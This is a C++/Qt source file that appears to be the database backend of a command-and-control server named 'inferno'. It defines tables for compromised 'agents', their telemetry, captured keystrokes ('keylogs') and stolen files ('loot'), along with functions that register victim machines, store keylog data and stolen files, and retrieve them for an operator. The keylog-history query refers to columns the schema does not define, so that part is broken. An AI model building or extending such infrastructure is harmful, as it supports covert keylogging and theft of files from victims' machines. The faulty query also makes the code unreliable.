#include "../include/Inferno_Database.hpp"
#include <QTimeZone>

namespace inferno {

Inferno_Database& Inferno_Database::instance() {
    static Inferno_Database inst;
    return inst;
}

Inferno_Database::Inferno_Database(QObject* parent) : QObject(parent) {}

Inferno_Database::~Inferno_Database() {
    close();
}

bool Inferno_Database::initialize(const QString& host, int port, const QString& dbName, const QString& user, const QString& password) {
    if (QSqlDatabase::isDriverAvailable("QPSQL")) {
        m_db = QSqlDatabase::addDatabase("QPSQL");
        m_db.setHostName(host);
        m_db.setPort(port);
        m_db.setDatabaseName(dbName);
        m_db.setUserName(user);
        m_db.setPassword(password);
        qDebug() << "[Database] Initializing with PostgreSQL 16...";
    } else {
        m_db = QSqlDatabase::addDatabase("QSQLITE");
        m_db.setDatabaseName(":memory:");
        qDebug() << "[Database] WARNING: QPSQL driver not found. Falling back to in-memory SQLite for logic verification.";
    }

    if (!m_db.open()) {
        qDebug() << "[Database] CRITICAL: Failed to open" << m_db.driverName() << "connection:" << m_db.lastError().text();
        return false;
    }

    qDebug() << "[Database] Successfully connected via" << m_db.driverName();
    return createTables();
}

void Inferno_Database::close() {
    if (m_db.isOpen()) {
        m_db.close();
    }
}

bool Inferno_Database::createTables() {
    QSqlQuery query;
    QString driver = m_db.driverName();

    if (driver == "QSQLITE") {
        // SQLite Compatible Schema
        const QStringList schemas = {
            "CREATE TABLE IF NOT EXISTS agents (id INTEGER PRIMARY KEY AUTOINCREMENT, uuid VARCHAR(64) UNIQUE, ip_address VARCHAR(45), hostname TEXT, os_info TEXT, first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, is_online BOOLEAN DEFAULT TRUE)",
            "CREATE TABLE IF NOT EXISTS telemetry (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_uuid VARCHAR(64), type VARCHAR(32), content TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)",
            "CREATE TABLE IF NOT EXISTS keylogs (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id INTEGER, data TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)",
            "CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id INTEGER, filename TEXT, file_type VARCHAR(32), content BLOB, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)"
        };

        for (const QString& sql : schemas) {
            if (!query.exec(sql)) {
                qDebug() << "[Database] SQLite schema error:" << query.lastError().text();
                return false;
            }
        }
        return true;
    }

    // PostgreSQL 16 Production Schema
    // 1. Agents Table
    if (!query.exec("CREATE TABLE IF NOT EXISTS agents ("
                    "id SERIAL PRIMARY KEY, "
                    "uuid VARCHAR(64) UNIQUE, "
                    "ip_address VARCHAR(45), "
                    "hostname TEXT, "
                    "os_info TEXT, "
                    "first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, "
                    "last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, "
                    "is_online BOOLEAN DEFAULT TRUE)")) {
        qDebug() << "[Database] Error creating agents table:" << query.lastError().text();
        return false;
    }

    // 2. Telemetry Table
    if (!query.exec("CREATE TABLE IF NOT EXISTS telemetry ("
                    "id SERIAL PRIMARY KEY, "
                    "agent_uuid VARCHAR(64) REFERENCES agents(uuid), "
                    "type VARCHAR(32), "
                    "content TEXT, "
                    "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")) {
        qDebug() << "[Database] Error creating telemetry table:" << query.lastError().text();
        return false;
    }

    // 3. Keylogs Table
    if (!query.exec("CREATE TABLE IF NOT EXISTS keylogs ("
                    "id SERIAL PRIMARY KEY, "
                    "agent_id INTEGER REFERENCES agents(id), "
                    "data TEXT, "
                    "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")) {
        qDebug() << "[Database] Error creating keylogs table:" << query.lastError().text();
        return false;
    }

    // 4. Loot Table
    if (!query.exec("CREATE TABLE IF NOT EXISTS loot ("
                    "id SERIAL PRIMARY KEY, "
                    "agent_id INTEGER REFERENCES agents(id), "
                    "filename TEXT, "
                    "file_type VARCHAR(32), "
                    "content BYTEA, "
                    "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")) {
        qDebug() << "[Database] Error creating loot table:" << query.lastError().text();
        return false;
    }

    return true;
}

int Inferno_Database::registerAgent(const QString& uuid, const QString& ip, const QString& hostname, const QString& osInfo) {
    QSqlQuery query;
    
    if (m_db.driverName() == "QSQLITE") {
        query.prepare("INSERT INTO agents (uuid, ip_address, hostname, os_info, last_seen, is_online) "
                      "VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, TRUE) "
                      "ON CONFLICT(uuid) DO UPDATE SET "
                      "ip_address=excluded.ip_address, hostname=excluded.hostname, os_info=excluded.os_info, "
                      "last_seen=excluded.last_seen, is_online=excluded.is_online");
        query.addBindValue(uuid);
        query.addBindValue(ip);
        query.addBindValue(hostname);
        query.addBindValue(osInfo);
        
        if (!query.exec()) {
            qDebug() << "[Database] SQLite registration error:" << query.lastError().text();
            return -1;
        }
        
        // Retrieve ID for SQLite
        query.prepare("SELECT id FROM agents WHERE uuid = ?");
        query.addBindValue(uuid);
        if (query.exec() && query.next()) return query.value(0).toInt();
        return -1;
    }

    // PostgreSQL 16 Implementation - SECURE: Using prepared statements to prevent SQL Injection
    query.prepare("INSERT INTO agents (uuid, ip_address, hostname, os_info, last_seen, is_online) "
                  "VALUES (:uuid, :ip, :host, :os, CURRENT_TIMESTAMP, TRUE) "
                  "ON CONFLICT (uuid) DO UPDATE SET "
                  "ip_address = EXCLUDED.ip_address, hostname = EXCLUDED.hostname, os_info = EXCLUDED.os_info, "
                  "last_seen = EXCLUDED.last_seen, is_online = EXCLUDED.is_online "
                  "RETURNING id");
    
    query.bindValue(":uuid", uuid);
    query.bindValue(":ip", ip);
    query.bindValue(":host", hostname);
    query.bindValue(":os", osInfo);

    if (query.exec() && query.next()) {
        return query.value(0).toInt();
    } else {
        qDebug() << "[Database] Error registering agent:" << query.lastError().text();
        return -1;
    }
}
bool Inferno_Database::logTelemetry(const QString& uuid, const QString& type, const QString& content) {
    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") {
        qDebug() << "[Database] WARNING: Attempted to log telemetry for UNKNOWN agent. Dropping data.";
        return false;
    }
    QSqlQuery query;
    query.prepare("INSERT INTO telemetry (agent_uuid, type, content) VALUES (:uuid, :type, :content)");
    query.bindValue(":uuid", uuid);
    query.bindValue(":type", type);
    query.bindValue(":content", content);

    if (!query.exec()) {
        qDebug() << "[Database] Error logging telemetry:" << query.lastError().text();
        return false;
    }
    return true;
}

bool Inferno_Database::logKeylog(const QString& uuid, const QString& data) {
    QSqlQuery query;
    query.prepare("INSERT INTO keylogs (agent_id, data) "
                  "VALUES ((SELECT id FROM agents WHERE uuid = ?), ?)");
    query.addBindValue(uuid);
    query.addBindValue(data);

    if (!query.exec()) {
        qDebug() << "[Database] Error logging keylog:" << query.lastError().text();
        return false;
    }
    return true;
}

bool Inferno_Database::logLoot(const QString& uuid, const QString& filename, const QString& fileType, const QByteArray& content) {
    QSqlQuery query;
    query.prepare("INSERT INTO loot (agent_id, filename, file_type, content) "
                  "VALUES ((SELECT id FROM agents WHERE uuid = ?), ?, ?, ?)");
    query.addBindValue(uuid);
    query.addBindValue(filename);
    query.addBindValue(fileType);
    query.addBindValue(content);

    if (!query.exec()) {
        qDebug() << "[Database] Error logging loot:" << query.lastError().text();
        return false;
    }
    return true;
}

void Inferno_Database::setAgentOnlineStatus(const QString& uuid, bool online) {
    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return;
    
    QSqlQuery query;
    query.prepare("UPDATE agents SET is_online = :online, last_seen = CURRENT_TIMESTAMP WHERE uuid = :uuid");
    query.bindValue(":online", online);
    query.bindValue(":uuid", uuid);
    
    if (!query.exec()) {
        qDebug() << "[Database] Error updating online status:" << query.lastError().text();
    }
}

AgentProfile Inferno_Database::getAgentProfile(const QString& uuid) {
    AgentProfile profile;
    profile.uuid = uuid;
    
    QSqlQuery query;
    query.prepare("SELECT ip_address, hostname, os_info, first_seen, last_seen, is_online FROM agents WHERE uuid = :uuid");
    query.bindValue(":uuid", uuid);
    
    if (query.exec() && query.next()) {
        profile.ip = query.value(0).toString();
        profile.hostname = query.value(1).toString();
        profile.osInfo = query.value(2).toString();
        
        QDateTime fs = query.value(3).toDateTime();
        fs.setTimeZone(QTimeZone::utc());
        profile.firstSeen = fs.toLocalTime();
        
        QDateTime ls = query.value(4).toDateTime();
        ls.setTimeZone(QTimeZone::utc());
        profile.lastSeen = ls.toLocalTime();
        
        profile.isOnline = query.value(5).toBool();
    } else if (query.lastError().isValid()) {
        qDebug() << "[Database] Error fetching agent profile for" << uuid << ":" << query.lastError().text();
    }
    return profile;
}

QStringList Inferno_Database::getTelemetryHistory(const QString& uuid, const QString& type, int limit) {
    QStringList history;
    QSqlQuery query;
    
    QString sql = "SELECT timestamp, content FROM telemetry WHERE agent_uuid = :uuid ";
    if (!type.isEmpty() && type != "ALL") {
        sql += "AND type = :type ";
    }
    sql += "ORDER BY timestamp DESC LIMIT :limit";

    query.prepare(sql);
    query.bindValue(":uuid", uuid);
    if (!type.isEmpty() && type != "ALL") {
        query.bindValue(":type", type);
    }
    query.bindValue(":limit", limit);

    // Diagnostic Log for the Operator
    qDebug() << "[Database] Fetching history for UUID:" << uuid << "Type:" << type;

    if (query.exec()) {
        while (query.next()) {
            QDateTime dt = query.value(0).toDateTime();
            dt.setTimeZone(QTimeZone::utc()); 
            QString ts = dt.toLocalTime().toString("HH:mm:ss");
            history.append(QString("[%1] %2").arg(ts, query.value(1).toString()));
        }
    } else {
        qDebug() << "[Database] History Fetch Error:" << query.lastError().text();
    }
    return history;
}

QStringList Inferno_Database::getKeylogHistory(const QString& uuid, int limit) {
    QStringList history;
    QSqlQuery query;
    query.prepare("SELECT timestamp, content FROM keylogs WHERE agent_uuid = :uuid ORDER BY timestamp DESC LIMIT :limit");
    query.bindValue(":uuid", uuid);
    query.bindValue(":limit", limit);

    if (query.exec()) {
        while (query.next()) {
            QDateTime dt = query.value(0).toDateTime();
            dt.setTimeZone(QTimeZone::utc());
            QString ts = dt.toLocalTime().toString("HH:mm:ss");
            history.append(QString("[%1] %2").arg(ts, query.value(1).toString()));
        }
    }
    return history;
}

} // namespace inferno
